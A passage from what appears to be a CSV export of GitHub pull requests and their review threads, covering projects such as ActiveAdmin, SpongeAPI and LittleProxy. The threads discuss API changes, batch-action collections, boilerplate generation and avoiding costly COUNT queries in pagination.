(org.codehaus.sonar:sonar-server:src/main/java/org/sonar/server/computation/step/QualityProfileEventsStep.java) [![rule](https://raw.githubusercontent.com/SonarCommunity/sonar-github/master/images/rule.png)](http://nemo.sonarqube.org/coding_rules#rule_key=findbugs%3ANP_NULL_ON_SOME_PATH_FROM_RETURN_VALUE)\n""]"
129,SonarSource/sonarqube,402.0,"this PR contains:
* bug fixes in `MeasureVariations` and `MeasureRepositoryRule`
* move of computation of New Coverage measures to the Compute Engine
* drop of New Coverage decorators from batch","['Apply my feedback and LGTM !', 'PR updated:\r\n* feedback applied\r\n* rebased on master\r\n\r\nwaiting for check status', 'SonarQube analysis reported 4 issues:\n* ![MAJOR](https://raw.githubusercontent.com/SonarCommunity/sonar-github/master/images/severity-major.png) 4 major\n\nWatch the comments in this conversation to review them.']"
130,SpongePowered/SpongeAPI,207.0,"Added getOpposite and isOpposite methods, As well as reviewing and fixing the math for the secondary ordinal directions, but I'm still not convinced they should even be in the API.","['The Direction enum seems like the perfect candidate for a test. Have you used JUnit before?', ""No I havn't but I'm keen to learn and willing to give it a go, What tests would you be interested in?"", 'The build fails due to a lack of implementation on the vectors, would it be best to give them an implementation in the test? what is the best way to fix this?', '@ST-DDT In case you were wondering what happened, Zidane got me to squash the commits and remove the failing tests.', 'Just revisting this, did the math classes ever make it into the api? If so the original tests could be added back.\r\n\r\nhttps://gist.github.com/ryantheleach/afa72143ce38781919d0', ""@ryantheleach \r\nThere are some issues with the test you provide, iirc its from an earlier implementation from us which does not include the `Direction.NONE`. The most important issue is the vector comparison which fails due to double comparison with an offset of  0.000...0001`.\r\nI fixed the last few things in my local branch: https://github.com/ST-DDT/SpongeAPI/compare/directionTest\r\n\r\nI already offered it some time ago to the team in the IRC (Along with a minor fix for the Direction class), but it has been declined because the Direction class probably won't change. ""]"
131,SpongePowered/SpongeAPI,290.0,"This PR is my first pass at improving the Entity interface. The following has been done -

* Removed getPosition, getX, getY, getZ in favor of getLocation
* Removed getVectorRotation in favor of getRotation
* Removed EulerDirection in favor of Vector3f
* Removed interact methods as they are meant for Players
* Removed eject, dismount in favor of setVehicle
* Renamed getRiding, getRidden in favor of getVehicle
* Renamed teleport to setLocation
* Renamed isDead to isRemoved
* Updated javadocs","['I disagree with removing ```eject()``` and ```mount()``` in favour of ```setRidden()``` and ```setRider()``` respectively.\r\n', 'hultberg OK after some discussion on IRC, we can get away with using only 1 method for both getter and setter. We think going with the following is best\r\n\r\nsetVehicle(Entity entity)\r\ngetVehicle()\r\n\r\nExample 1 , player1.setVehicle(player2)  would put player 1 on top of player 2.\r\nExample 2, player2.setVehicle(player1) would put player 2 on top of player 1.\r\nExample 3, player1.setVehicle(null) would dismount player1 from player2\r\n\r\nHow does this sound?', 'That is a very good solution! :)', ""@bloodmc One more question:\r\nHow do i check if a minecart has passengers if there is no `getPassenger()` method?\r\nI don't need a setter, but a getter would be appreciated,"", 'OK updated with suggested changes. We still need to discuss on how to handle setLocation with passengers and vehicles.']"
132,SpongePowered/SpongeAPI,671.0,"This PR makes a number of (interrelated) improvements to the event generation system:

* Previously, for methods overridden by other interfaces (think `getEntity`, `getLiving`, `getHuman`, etc), only one accessor and mutator would be generated. Due to the confusing way in which java determines which return type would be used, the method called wouldn't always be implemented. This PR generates accessors and mutators for all overridden methods - using only one field.

* Instead of having all generated event classes extend from `AbstractEvent`, the base class can be specified using the new `@ImplementedBy` annotation, or the event generator plugin system. This is used to implement methods which don't conform to the accessor/mutator pattern expected by the class generator (`getXXX`, `setXXX`, `isXXX`).

* The sponge event factory test has been extended to call all of the methods on event class, instead of just generating the classes. This ensures that all events generate as expected.

The event generator plugin system allows plugins or implementations to customize the resolution of event base classes, through registering an `EventFactoryPlugin`. This allows a different superclass to be chosen on a per-event basis, without introducing the requirement of a bytecode manipulation framework.

Several events have had methods modified or annotations added in order to correctly compile into bytecode.","['Pretty.', '> The event generator plugin system allows plugins or implementations to customize the resolution of event base classes, through registering an EventFactoryPlugin. This allows a different superclass to be chosen on a per-event basis, without introducing the requirement of a bytecode manipulation framework.\r\n\r\nThis sounds cool, but what does it actually mean to a plugin developer?', '> This sounds cool, but what does it actually mean to a plugin developer?\r\n\r\nIt means you can raise custom events which cannot be fully generated by the class generator by specifying an abstract base class which implements the additional methods. The `EventFactoryPlugin` is capable of handling base-class resolution outside the scope of the normal annotation-based behaviour in the base system.']"
133,SpoutDev/Spout,2233.0,Signed-off-by: thehutch <th3hutch@yahoo.co.uk>,"['Besides that one comment, this commit looks sound and mergable.\r\n\r\n@Zidane?\r\n\r\n', ""Looks fine to me (finally). @Zidane I'm pulling""]"
134,SpoutDev/Spout,2239.0,"- Changed nextId to an AtomicInteger
- General improvements
- Minor changes to various classes

Signed-off-by: thehutch <th3hutch@yahoo.co.uk>",[]
135,activeadmin/activeadmin,3421.0,this is the implementation for #2678,"['Could you rebase this on master? It can no longer be cleanly merged.', 'implemented suggestions and rebased', 'Thanks!']"
136,activeadmin/activeadmin,3623.0,#2811 Clear Filters button should preserve custom query params,"['I see a general problem with your implementation. It filters only the knowing ransack predicates, whats about the custom predicates?', 'I saw the custom predicates but was unsure how to handle them.  Do you have any suggestions?', ""I don't mean the [ransack extensions / metasearch backports](https://github.com/activeadmin/activeadmin/blob/master/lib/ransack_ext.rb). I mean that a developer can add his own predicates and can use filters without a predicate.\r\n\r\nWhats about the way wich @seanlinsley provides in #2811?"", ""That one didn't seem to work.  I changed it to be similar though and it should handle custom predicates now."", 'It looks good now, but please squash it into one commit and the tests are failing, maybe selenium is the reason', 'maybe it will help you a sub dependency uses `phantomjs`, could we run the test with that?', 'Commits squashed']"
137,activeadmin/activeadmin,3503.0,fix for a https://github.com/activeadmin/activeadmin/pull/1815#issuecomment-59659670,"['The spec run, but the cucumber fails. I need more work on that.', '@timoschilling , I tried to port some of  changes to local monkeypatches and check manually if it works. I had many no block given (ActionView::Template::Error) exceptions. However changing  ```instance_exec(batch_action.inputs).to_json``` to ```render_in_context(self, batch_action.inputs).to_json`` in  lib/active_admin/batch_actions/views/batch_action_selector.rb fixed this for me. Thanks.\r\n', '@Fivell thanks for the hint!', '@timoschilling , please take a look at this implementation https://github.com/Fivell/activeadmin/commit/0c0e0da22702c794a3c1008a545dffd7e13c1520\r\n', '@timoschilling , any updates for this? Thanks', '@Fivell maybe do you want to continue the work on this PR? If yes create a new branch forked form the `fix_batch_action_context` branch and create a new PR, I will close this one then', ""@timoschilling , yes I want this to be merged. I don't know how to create new fork if I already has one. Can you help with this?"", '@Fivell sorry, I mean a branch which is based on `fix_batch_action_context` instead of `master`. Then you can continue the work on my base.', 'Closed by #3751', '@timoschilling , so will you merge it to master? #3751 was merged to your fix_batch_action_context branch', '@Fivell my mistake, I have think your PR was merged into master. Tanks for the good work']"
138,activeadmin/activeadmin,3775.0,"Goal of this PR is to provide flexible access to collection in different scopes of request livecycle.
DataAccess#find_collection  becomes more generic and can return different result depends on ```options``` argument.
Can be used in batch actions (no sorting,pagination needed), csv exports(no pagination needed), etc

","[""travis-ci failed  with cucumber \r\n> Failing Scenarios:\r\ncucumber features/index/filters.feature:109 # Scenario: Clearing filter preserves custom parameters\r\n\r\ntrace\r\n\r\n>ReferenceError: Can't find variable: options\r\nReferenceError: Can't find variable: options\r\n    at http://127.0.0.1:56079/assets/active_admin.js:20289 in CheckboxToggler\r\n    at http://127.0.0.1:56079/assets/active_admin.js:20779 in TableCheckboxToggler\r\n\r\n\r\n\r\nUPD, looks like fixed by merging #3776"", ""@timoschilling , can you help to understand why build failed ? \r\nI can't understand how batch actions can be related to form specs ...\r\n>> ActiveAdmin::FormBuilder with has many inputs with allow destroy with an existing post should include a boolean field for _destroy"", ""I think build fails while a dependency has changed. See #3781.\r\nProblem is that I don't have the time to find the bug, at the moment."", 'please rebase this commit, #3781 is closed', ""@timoschilling , feel like few comments and specs should be added, but I will have free time only next week, so let's wait a bit."", '@timoschilling , rebased', 'What are the open task?', '@timoschilling, we started this PR, having conversation in #3764 , also I hope it will help implement #2375  in future\r\n', '#2375 could be a new PR. Is there something to do before merging this?', ""@timoschilling , #2375  must be new PR, I don't feel like I can do this because of luck UI skills , hope somebody can help with it. \r\nbefore merging this we should decide if this collection of appliers is what we need for default batch actions collection https://github.com/Fivell/activeadmin/commit/d3b25b06318e5b256bf3f71d6b2ed69573896c4a#diff-95a1987f84cc2650e828b2d27c9a2f7fR29\r\n\r\nPlease take a look"", 'Feedback:\r\n1. Should we include `includes`? This can speed up the destroying of relations `has_many :orders, dependent: :destroy`\r\n2. Should we add a `COLLECTION_APPLIES` constant to the `BatchController`? This will allow the customization.\r\n\r\nQuestions:\r\n1. Do you want to write some more test?', ""@timoschilling, I can't understand about ```includes```. In real life has_many relations are not needed for rendering , that's why there can't be such includes on resource level. \r\n \r\nWe can also add ```COLLECTION_APPLIES``` for ```BatchController```, but it is also included as a part of  ```DataAccess```  module. \r\n\r\nWe already can call \r\n ```find_collection(only: [])``` if we don't wan't to use ```batch_colleciton``` \r\n\r\n\r\nadded more tests for ```DataAccess```  module. "", '`includes` prevent n+1 queries.\r\n\r\nWhat I mean is:\r\n```ruby\r\nclass ActiveAdmin::BatchActions::Controller\r\n  COLLECTION_APPLIES = [:authorization_scope, :collection_decorator, :filtering, :scoping, :includes]\r\n\r\n  def batch_action_collection\r\n    find_collection(only: COLLECTION_APPLIES)\r\n  end\r\nend\r\n```\r\n\r\nYou had many fights with the doc :wink: \r\n', ""@timoschilling , I know that but I can't find real example when we should add ```include``` for batch_collection , when common scenario is changing some attribute of each element of collection.  I mean why we need make additional sql query for include if we don't care about it in almost all cases?\r\n\r\nIf we are talking about ```has_many``` relation, I would not add ```include``` applier just to optimise destroy_all, because it will be performed on every index action , but in general I don't want this.   I hope you understand what I mean"", 'The most common Scenario:\r\nGiven:\r\n```ruby\r\nclass Blog\r\n has_many :posts, dependent: :destroy\r\nend\r\n\r\nclass Post\r\n has_many :comments, dependent: :destroy\r\nend\r\n```\r\n\r\nDB:\r\n2 Blogs with 2 Post with 2 Comments each\r\n\r\nExec batch delete of both with includes:\r\n```sql\r\nSELECT * FROM blogs WHERE id IN (1, 2);\r\nSELECT * FROM posts WHERE blog_id IN (1, 2);\r\nSELECT * FROM comments WHERE post_id IN (1, 2, 3, 4);\r\n```\r\n\r\nExec batch delete of both without includes:\r\n```sql\r\nSELECT * FROM blogs WHERE id IN (1, 2);\r\nSELECT * FROM posts WHERE blog_id = 1;\r\nSELECT * FROM posts WHERE blog_id = 2;\r\nSELECT * FROM comments WHERE post_id = 1;\r\nSELECT * FROM comments WHERE post_id = 2;\r\nSELECT * FROM comments WHERE post_id = 3;\r\nSELECT * FROM comments WHERE post_id = 4;\r\n```\r\n\r\nOr a other example:\r\nA Shop with Orders, each Order has n Items and a batch action ""Send Invoice"", here we can use a `includes(:items)`', ""@timoschilling, lets look at example with blog/posts/comments \r\nand think how resource for blog will look like.\r\n\r\n```ruby\r\nActiveAdmin.register Blog do \r\n  \r\n    index do\r\n       column :name\r\n       column :description\r\n       column :created_at \r\n    end\r\n    \r\nend\r\n```\r\nor something like this. What are saying is that for destroy optimisation I should add ```includes``` applier (but it doesn't exist at all on resource level by default)\r\n\r\nok lets add it and see what we have after\r\n\r\n```ruby\r\nActiveAdmin.register Blog do \r\n   includes :posts\r\n   \r\n    index do\r\n       column :name\r\n       column :description\r\n       column :created_at \r\n    end\r\n    \r\nend\r\n```\r\nok so now we have faster batch destroy, but what about index ???  Index action uses includes applier also. We are loading posts every time on index page because index page uses ```find_collection``` without arguments.\r\n (there can be hundreds or thousands of posts) but why we are doing it ?  \r\n\r\nYour example is not generic, to fix it we just need to override default destroy batch action, how it is already described in documentation, in other cases we bring optimisation to one place  , but remove it in other one.\r\n\r\n\r\n\r\n\r\n"", ""To clarify, ActiveAdmin DSL doesn't allow us to add ```includes``` applier for batch_action and not use it for simple index rendering"", ""Ok you are right in the Blog example `includes` don't make sense for the index action.\r\n\r\nBut let us do this:\r\n```ruby\r\nclass ActiveAdmin::BatchActions::Controller\r\n  COLLECTION_APPLIES = [:authorization_scope, :collection_decorator, :filtering, :scoping, :includes]\r\n\r\n  def batch_action_collection\r\n    find_collection(only: COLLECTION_APPLIES)\r\n  end\r\nend\r\n```\r\nMaybe with a other constant name."", ""@timoschilling , ok let's see what travis will tell"", '@timoschilling , you\'re also hinting about docs,  how do you think I can improve it?\r\nBTW\r\n what about \r\n```ruby\r\n COLLECTION_APPLIES = [\r\n        :authorization_scope,\r\n        :collection_decorator,\r\n        :filtering,\r\n        :scoping,\r\n        :includes\r\n      ].freeze\r\n\r\n      def batch_action_collection(only = COLLECTION_APPLIES)\r\n        find_collection(only: only)\r\n      end\r\n```\r\n\r\n\r\nthis gives us next\r\n\r\n```\r\nActiveAdmin.register Post do\r\n  batch_action :flag do |ids|\r\n    batch_action_collection([:collection_decorator, :includes]).find(ids).each do |post|\r\n      post.flag! :hot\r\n    end\r\n    redirect_to collection_path, alert: ""The posts have been flagged.""\r\n  end\r\nend\r\n```\r\n\r\nUPD , we don\'t need it because we can do the same with ```find_collection```\r\n```\r\nActiveAdmin.register Post do\r\n  batch_action :flag do |ids|\r\n    find_collection(only: [:collection_decorator, :includes]).find(ids).each do |post|\r\n      post.flag! :hot\r\n    end\r\n    redirect_to collection_path, alert: ""The posts have been flagged.""\r\n  end\r\nend\r\n```\r\n', ':+1: for\r\n```ruby\r\n      def batch_action_collection(only = COLLECTION_APPLIES)\r\n        find_collection(only: only)\r\n      end\r\n```', '@timoschilling , what next?\r\n', 'Sorry I missed your last commit. I think we can merge or miss I something that you want to do?', '@timoschilling , I think it can be merged, or I should rebase and squash commits?\r\n', ':+1:  good work']"
139,activeadmin/activeadmin,3825.0,"Proof of concept branch for #3807 

@timoschilling Is this something we want to pursue? Will output the following (as-is, I imagine we would want to change the copy):

``` RUBY
ActiveAdmin.register Post do

# Available Filters
#
# filter :id
# filter :title
# filter :body
# filter :published_at
# filter :author
# filter :position
# filter :custom_category
# filter :starred
# filter :foo
# filter :created_at
# filter :updated_at

# Sample Index
#
# index do
#   selectable_column
#   id_column
#   column :id
#   column :title
#   column :body
#   column :published_at
#   column :author
#   column :position
#   column :custom_category
#   column :starred
#   column :foo
#   column :created_at
#   column :updated_at
#   actions
# end
end
```

Of course, this wouldn't be enabled by default. The syntax could be something like `rails g active_admin:resource --include-boilerplate`","['I am not averse to this.\r\n\r\nMaybe we can provide the same for scopes, show and form.\r\n\r\nAnd it will be cool to something like:\r\n```\r\nrails g active_admin:resource --add-boilerplate\r\n# or\r\nrails g active_admin:resource --update-boilerplate\r\n```', ""@timoschilling The plan was to add boilerplate for those things, as well as the visibility actions. I just couldn't find a quick way to nab the model associations and wanted to show a proof of concept to get approved before I went further. I'll work on this some more this weekend and ping you again when it's ready to be reviewed."", 'Go for it I like the idea! :+1: ', '+15 ?! I like.\n\nOn Sun, Mar 1, 2015 at 3:58 PM, Timo Schilling <notifications@github.com>\nwrote:\n\n> Go for it I like the idea! [image: :+1:]\n>\n> \xe2\x80\x94\n> Reply to this email directly or view it on GitHub\n> <https://github.com/activeadmin/activeadmin/pull/3825#issuecomment-76633549>\n> .\n>\n\n\n\n-- \nJeff Ancel\n\n(314) 703-8829 - Main\n\nwww.jeffancel.com\n', ""@timoschilling @seanlinsley I have the filters/show/index/actions complete, as well as the flag to turn boilerplate generation on. Any suggestions on how to generate the form? With various model associations, I don't see that being a simple task.\r\n\r\nI could keep it simple and only provide boilerplate for top-level attributes, but it'd be useful to include everything."", ""This is excellent @ccallebs thanks! Personally, I say make this the default. Is there any reason we don't want too?"", ""Thumbs up for default!\n\nOn Monday, April 13, 2015, Javier Julio <notifications@github.com> wrote:\n\n> This is excellent @ccallebs <https://github.com/ccallebs> thanks!\n> Personally, I say make this the default. Is there any reason we don't want\n> too?\n>\n> \xe2\x80\x94\n> Reply to this email directly or view it on GitHub\n> <https://github.com/activeadmin/activeadmin/pull/3825#issuecomment-92518996>\n> .\n>\n\n\n-- \nJeff Ancel\n\n(314) 703-8829 - Main\n\nwww.jeffancel.com\n"", ':-1: for default\r\nbut :+1: for a new expect option for `filter` and `index` or `columns`', 'This should definitely be added to the changelog, and the getting started documentation.']"
140,activeadmin/activeadmin,3818.0,"Fixes #3817. Adds logic to skip `datepicker()` call if browser is WebKit and the input type is `date`.

### Code
``` RUBY
ActiveAdmin.register Post do
  filter :published_at, as: :date_picker
  filter :created_at
end
```

### On Chrome
![screen shot 2015-02-25 at 8 52 04 pm](https://cloud.githubusercontent.com/assets/397982/6384861/891a7f0e-bd30-11e4-9586-27549738e578.png)

### On Firefox
![screen shot 2015-02-25 at 8 51 55 pm](https://cloud.githubusercontent.com/assets/397982/6384869/a35da21a-bd30-11e4-9e7b-914f27669283.png)

------------
One thing to note: There's a similarly named class called `datepicker_input`. I think it's fine to rename it into something more descriptive (and less conflicting) but I wanted to check first.","[""@timoschilling Just pinging you about this. It's ready for review."", 'Can you make the browser support detection change? Then I will merge it', '@timoschilling I tried the suggested solution but it didn\'t work. On FF, the input type is still ""date"" even though there is no corresponding datepicker control to go with it. I think the WebKit test is necessarily, unless there exists some sort of feature detection for the datepicker input.\r\n\r\n![screen shot 2015-03-10 at 4 08 54 pm](https://cloud.githubusercontent.com/assets/397982/6584172/d93f0f86-c73f-11e4-960e-871ce47b9d1e.png)\r\n', 'I have tried it too, the dom keep the type as date, but `i.type` returns text, so the test should work.', 'btw: the test is copied form [modernizr](https://github.com/russfrisch/modernizr-rails/blob/master/vendor/assets/javascripts/modernizr.js#L885)', '@timoschilling Gotcha, thanks! I reworked it and everything works as expected.', ""I you don't have a nicer fix for https://github.com/activeadmin/activeadmin/pull/3818#discussion-diff-25876675R144, I please you to squash all commits and I will merge they after that."", '@timoschilling Done!', 'Sorry one last thing: We should include a test for the DatePickerInput class']"
141,activeadmin/activeadmin,3848.0,"Addresses https://github.com/activeadmin/activeadmin/issues/3847.

The `pagination_total` option is supposed to prevent expensive `SELECT count(*)` queries from being performed when viewing a resource's index page.

However, while this option was hiding the display of the total number of pages, it did not actually prevent the query from being performed.

There were two reasons:

First, in `#build_pagination`, the line: `text_node paginate collection, options` would trigger Kaminari to call `#total_pages` on the collection, which would trigger the query. Excerpt of kaminari code:

``` ruby
def paginate(scope, options = {}, &block)
  options[:total_pages] ||= options[:num_pages] || scope.total_pages
```

By passing in the `:total_pages` option, we short circuit this assignment and avoid the query.

The downside is we do so by hardcoding in an essentially random total pages count of 100. I chose the number 100, because I wanted to ensure ellipses would appear in Kaminari's ""Page 1, 2, 3, ..., Next, Last"" links, no matter how many links are configured to be displayed. However, if the resource only had 2 pages worth of items, then clicking the ""3"" would result in an empty page. That said, without querying the resource, there's no way to know how many pages there should be.

Second, in `#page_entries_info`, the call `collection.num_pages` also triggered a `SELECT count(*)`. I re-arranged the conditionals to avoid that call if `@display_total` is false, while trying to keep the behavior the same.","[""Do you want me to modify the line lengths? They're mostly from code I just moved around, and I didn't want to be too invasive. My comments are longer than 80 characters since I didn't realize the length restriction. I can change the line breaks if you want."", 'Okay, I changed my comments to be within 80 characters, and changed single quotes to double. ', 'note: related to #2638\r\n\r\n> The downside is we do so by hardcoding in an essentially random total pages count of 100. I chose the number 100, because I wanted to ensure ellipses would appear in Kaminari\'s ""Page 1, 2, 3, ..., Next, Last"" links, no matter how many links are configured to be displayed. However, if the resource only had 2 pages worth of items, then clicking the ""3"" would result in an empty page. That said, without querying the resource, there\'s no way to know how many pages there should be.\r\n\r\nSorry but I can\'t merge that, that\'s a hack and not a solution. In my eyes this is not acceptable.\r\n\r\nThere are some unexpected behaviors if you trie all variants of `index pagination_total: false do` and `config.paginate = false`.\r\n\r\nBTW: In my test app I still see count queries:\r\n```sql\r\nSELECT COUNT(count_column) FROM (SELECT  1 AS count_column FROM `companies`  WHERE (user_id IS NOT NULL) LIMIT 10000 OFFSET 0) subquery_for_count\r\n```\r\n\r\nHave you read #2638? I\'m not very familiar with #2638 but in my understanding it\'s a kaminari bug.', 'Apologies, I didn\'t see that other issue. I tried searching for `pagination_total` and it didn\'t come up.\r\n\r\n> There are some unexpected behaviors if you trie all variants of index pagination_total: false do and config.paginate = false.\r\n\r\nI\'m sorry, I don\'t understand this. Can you explain a bit? And if you disable pagination then won\'t that blow up activeadmin if you have millions of records (the impetus for turning `pagination_total: false`?\r\n\r\n> ``` \r\n> SELECT COUNT(count_column) FROM (SELECT  1 AS count_column FROM `companies`  WHERE (user_id IS NOT NULL) LIMIT 10000 OFFSET 0) subquery_for_count\r\n> 111\r\n> ```\r\n\r\nYeah, I get these, too, but they run instantaneously for me. The `LIMIT` there narrows it down to just 10,000 records (and in my configuration it\'s just 30). I think it\'s to determine how many records are being displayed on the current page, rather than the total number of records?\r\n\r\nThe query to look out for is `SELECT count(*) FROM ""companies""`. Before my patch that one query can take upwards of seconds if you have millions of records.\r\n\r\n> Sorry but I can\'t merge that, that\'s a hack and not a solution. In my eyes this is not acceptable.\r\n\r\nThank you for the blunt feedback. I\'ll see if I can find another approach.', 'Okay, I\'ve looked into this some more, including #2638.\r\n\r\nContrary to what #2638 says, I\'d argue that this is _not_ a bug in Kaminari, but rather a feature request. It _is_ a bug in activeadmin, because the documentation advertises this as a feature that removes the `count (*)` and has some code intending that effect, but does not actually do so. I poked around the Kaminari codebase, and unfortunately don\'t feel I could cleanly implement the feature in the time I\'m willing to spend.\r\n\r\nWhile Kaminari does not have an ""infinite pages"" feature, it _does_ let you specify the `total_pages` as an option, so it doesn\'t have to do the query. That\'s what my PR took advantage of, although I arbitrarily set it to `100`.\r\n\r\nI looked at #2638 and @azach links to a clever approach called `activeadmin_fuzzy_paginate`, which I think is a more elegant solution than the way I did. If I changed my PR to use his approach would that suffice?\r\n\r\nLet me explain the issue and the approach:\r\n\r\nHere\'s a screenshot of the pagination component:\r\n\r\n![screen shot 2015-03-10 at 11 11 53 am](https://cloud.githubusercontent.com/assets/384428/6577840/091d44a8-c717-11e4-8f05-08cea8e06b95.png)\r\n\r\nThe activeadmin code that generates this is:\r\n``` ruby\r\ndef build_pagination\r\n  options = {}\r\n  options[:param_name] = @param_name if @param_name\r\n  text_node paginate collection, options\r\nend\r\n```\r\nThe pagination component can be configured via the `options` that are passed in.\r\n\r\nThere are two parts to the pagination component that are relevant here:\r\n* The links `96, 97, 98, 99, 100`. `98` is the current page, and the quantity of links on each side is determined in Kaminari via `Kaminari.config.window`.\r\n* The links `9999, 1000`. These are the links starting from `total_pages` and counting backwards. The number of links is determined by `options[:right]`.\r\n\r\nSo the clever approach is still to send in `options[:total_pages]` so Kaminari doesn\'t calculate it (like I did in my PR). But instead of hardcoding `100` as the total number of pages, we say the total is the ""current page + the window"". Since by definition we can\'t know the total number of pages without a `count(*)` this basically implements ""infinite pages"" by always saying there are at least `window` pages more than whatever we\'re on. We also set `options[:right] = 0` so we don\'t display the links to the last few pages.\r\n\r\n``` ruby\r\noptions[:total_pages] = collection.current_page + Kaminari.config.window + 1\r\noptions[:right] = 0\r\n```\r\n\r\nTo be clear there is still one small downside: Kaminari seems to generate the ""Last"" link no matter what. The screenshot from my proposed fix looks like this:\r\n\r\n![screen shot 2015-03-10 at 12 36 13 pm](https://cloud.githubusercontent.com/assets/384428/6579681/19123eb2-c722-11e4-9f7e-1d0be6b0b1e9.png)\r\n\r\nIf you click ""Last"", then the pagination on that page will look the same except now `14` will be the ""current page"", and it will count up `15, 16, 17, 18, ...`.\r\n\r\nSo, at this point, I see two possibilities:\r\n* I update my PR with the approach above.\r\n* We wait for someone to implement a new ""infinite pages"" feature in Kaminari which does basically the above, but also removes the `Last` link. Then we pass in `options[:infinite_pages] = true` or something here. Activeadmin lives with a bug until then, and we bump the required kaminari version in the gemspec when it happens. But I don\'t have the time or understanding of Kaminari codebase to do this, unfortunately.\r\n\r\nI hope this new approach is sufficiently ""not hacky"" so that you\'ll accept it, but I\'ll understand if not and close the PR. Please let me know.', 'Okay, since I had already worked out the code locally for the screenshots, I just pushed up my changes to the PR. Feel free to review and merge if you approve of the approach! :)', ""First: :+1: for one of the best documented PR's\r\n\r\nI still think it's to hacky.\r\n\r\nBut I have a idea:\r\nWhat if we change this:\r\n```ruby\r\noptions[:total_pages] = collection.current_page + Kaminari.config.window + 1\r\n```\r\nto this:\r\n```ruby\r\nnext_page = collection.page(collection.current_page + 1).per(@per_page).limit(1).any?\r\noptions[:total_pages] = collection.current_page + (next_page ? 1 : 0)\r\n```\r\nThat's just produce a query like this:\r\n```sql\r\nSELECT COUNT(count_column) FROM (SELECT  1 AS count_column FROM `companies` LIMIT 1 OFFSET 30) subquery_for_count\r\n```"", ""Oh, that's very interesting. I like it! Sorry I haven't had time to respond. I'll try out this approach over the weekend and update the PR."", 'There is a more easy version:\r\n```ruby\r\noffset = collection.page(collection.current_page + 1).per(@per_page).limit(1).count\r\noptions[:total_pages] = collection.current_page + offset\r\n```', 'I looked into these approaches this weekend and unfortunately they didn\'t work. I put a `byebug` in the code right where those code portions go, to try them out and see what gets executed in the way of SQL:\r\n\r\n```\r\n(byebug) collection.page(collection.current_page + 1).per(@per_page).limit(1).any?\r\n   (117.3ms)  SELECT COUNT(*) FROM ""messages""\r\ntrue\r\n(byebug)\r\n```\r\nand\r\n```\r\n(byebug) offset = collection.page(collection.current_page + 1).per(@per_page).limit(1).count\r\n   (108.0ms)  SELECT COUNT(*) FROM ""messages""\r\n989547\r\n(byebug)\r\n```\r\n\r\nI believe it\'s the usage of Kaminari\'s `#page` and `#per`. Doing it with straight `#offset` and `#limit` works:\r\n```\r\n(byebug) collection.offset( collection.current_page * @per_page + 1).limit(1).count\r\n   (2.1ms)  SELECT COUNT(count_column) FROM (SELECT 1 AS count_column FROM ""messages"" LIMIT 1 OFFSET 15001) subquery_for_count\r\n1\r\n(byebug)\r\n```\r\n\r\nHowever, I don\'t know enough about activeadmin: are we guaranteed that the `collection` in `PaginatedCollection` responds to `offset` and `limit`? Mine did, since I\'m using postgres and activerecord, but I\'m not sure what other data stores are supported.\r\n\r\nIf I can use `#offset` and `#limit`, I\'ll rewrite the PR to use them. Let me know.\r\n\r\nIf I can\'t use them, then I\'m out of ideas. I\'ll put in one more plug for the PR\'s current approach which is to set the total pages as ""current page + 1"". The only downside is that when you\'re on the last page, it will still have a ""Next"" button. In practice, I don\'t think it\'s a problem, since we\'re talking about collections with tens of thousands of pages here, and if a user opts in to `pagination_false: true`, then they shouldn\'t expect us to actually know the last page.', ""`collection` should be a ActiveRecord::Base or ActiveRecord::Relation object. It's possible but not allowed that `collection` returns something else. So we can assume that it has `offset` and `limit`."", ""Ah, great! I'll update the PR to use `offset` and `limit` when I have a chance."", 'Need we more test for that?', '@losvedir any updates?', ""@timoschilling - Sorry, for the delay. I made the `offset` and `limit` changes as well as hash formatting (just now pushed up) but have been working on tests for the feature. I'm not familiar with cucumber myself so the tests are slow going, and I don't have a ton of time on the side to work on it. Will try to complete the tests this week."", '@losvedir :+1: ', ""@timoschilling - Okay, ready for review! I've never used cucumber before; please let me know if I should be doing that a different way."", 'There is a syntax error on Ruby 1.9 https://travis-ci.org/activeadmin/activeadmin/jobs/57748755#L303', ""Ah, bummer. I don't have Ruby 1.9 on this computer and it's slow to build for me. Will have to take a look tonight."", ""Ah, ruby 1.9.3 didn't like the unicode literal in my string! Fixed."", 'I think this `collection.offset(collection.current_page * @per_page.to_i).limit(1).count` is great in that it\'s faster than actually counting the items in the collection, but what about leveraging the already queried `collection_size` from `ActiveAdmin::Helpers::Collection`?\r\n\r\nAs it stands there are 3 queries actually run against the table:\r\n\r\n```\r\nSELECT COUNT(count_column) FROM (SELECT  1 AS count_column FROM ""users"" LIMIT 50 OFFSET 0) subquery_for_count\r\nSELECT COUNT(count_column) FROM (SELECT  1 AS count_column FROM ""users"" LIMIT 1 OFFSET 50) subquery_for_count\r\nSELECT  ""users"".* FROM ""users""  ORDER BY ""users"".""id"" desc LIMIT 50 OFFSET 0\r\n```\r\n\r\n1) to count the number of items on the current page\r\n2) to peek if there is 1 item on the next page\r\n3) to load the items on the current page\r\n\r\nI see two separate potential optimizations here:\r\n\r\n  - What if we assume there is a next page if the current page as a complete collection?  There is a loss in information here no doubt... but if the goal is performance, this would eliminate a potentially expensive query.\r\n\r\n  -  What about actually loading the items on the first `collection_size` call in `ActiveAdmin::Helpers::Collection`?  Subsequent calls to iterate over the items will hit the cache.']"
142,activerecord-hackery/ransack,541.0,"Adapters overwrite each other, so they should not be required both","[""@ASnow LGTM. I'm sorry to have taken so long to review your PR. Good idea to extract the logic all over the codebase into one place. Travis-ci not passing put me off, but it appears to be a non-critical failure, so let's merge this in and make it work."", 'Thanks again for this PR :+1: ', 'Fixes #499 and #549.']"
143,adamfisk/LittleProxy,72.0,"This set of changes upgrades LittleProxy to use Netty 4.0.6.Final.

- The unit tests pass
- CoAdvisor shows no regressions
